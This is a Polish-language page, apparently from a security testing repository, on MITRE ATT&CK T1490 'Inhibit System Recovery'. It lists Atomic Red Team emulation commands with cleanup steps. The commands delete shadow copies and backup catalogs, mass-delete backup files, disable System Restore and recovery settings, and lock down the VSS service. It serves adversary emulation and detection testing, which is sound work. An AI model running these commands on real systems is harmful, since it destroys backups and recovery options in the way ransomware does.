# Alert: Inhibit System Recovery

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1490  
**Nazwa:** Inhibit System Recovery  
**Taktyki:** Impact  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Impact
Technique ID: T1490
Technique Name: Inhibit System Recovery
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Windows - Delete Volume Shadow Copies
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
vssadmin.exe delete shadows /all /quiet
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies/test_1.cmd)

### Windows - Delete Volume Shadow Copies via WMI
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wmic.exe shadowcopy delete
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies_vi/test_1.cmd)

### Windows - wbadmin Delete Windows Backup Catalog
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wbadmin delete catalog -quiet
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_wbadmin_Delete_Windows_Backup_/test_1.cmd)

### Windows - Disable Windows Recovery Console Repair
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Disable_Windows_Recovery_Conso/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Disable_Windows_Recovery_Conso/cleanup_1.cmd)

### Windows - Delete Volume Shadow Copies via WMI with PowerShell
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies_vi/test_1.ps1)

### Windows - Delete Backup Files
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Delete_Backup_Files/test_1.cmd)

### Windows - wbadmin Delete systemstatebackup
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
wbadmin delete systemstatebackup -keepVersions:0
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_wbadmin_Delete_systemstateback/test_1.cmd)

### Windows - Disable the SR scheduled task
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Disable_the_SR_scheduled_task/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1490\Windows_-_Disable_the_SR_scheduled_task/cleanup_1.cmd)

### Disable System Restore Through Registry
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Disable_System_Restore_Through_Registry/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1490\Disable_System_Restore_Through_Registry/cleanup_1.cmd)

### Windows - vssadmin Resize Shadowstorage Volume
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1490\Windows_-_vssadmin_Resize_Shadowstorage_/test_1.ps1)

### Modify VSS Service Permissions
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1490\Modify_VSS_Service_Permissions/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1490\Modify_VSS_Service_Permissions/cleanup_1.cmd)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1490)
